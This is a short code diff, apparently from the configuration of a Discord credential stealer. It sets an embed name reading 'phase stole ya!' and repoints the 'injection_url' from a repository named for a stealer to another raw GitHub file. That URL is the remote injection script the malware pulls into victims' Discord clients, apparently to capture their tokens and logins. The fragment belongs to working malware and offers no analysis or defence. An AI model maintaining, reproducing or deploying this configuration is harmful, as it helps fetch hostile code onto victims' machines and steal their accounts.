@@ -14,7 +14,7 @@ const config = {
   embed_name: 'phase stole ya!', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1259726489054613597/1260130711403233290/image.png?ex=668e33ad&is=668ce22d&hm=c22ee262f91'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/BapeCheatz/config.yml/main/inj', 
   /**
    
    **/
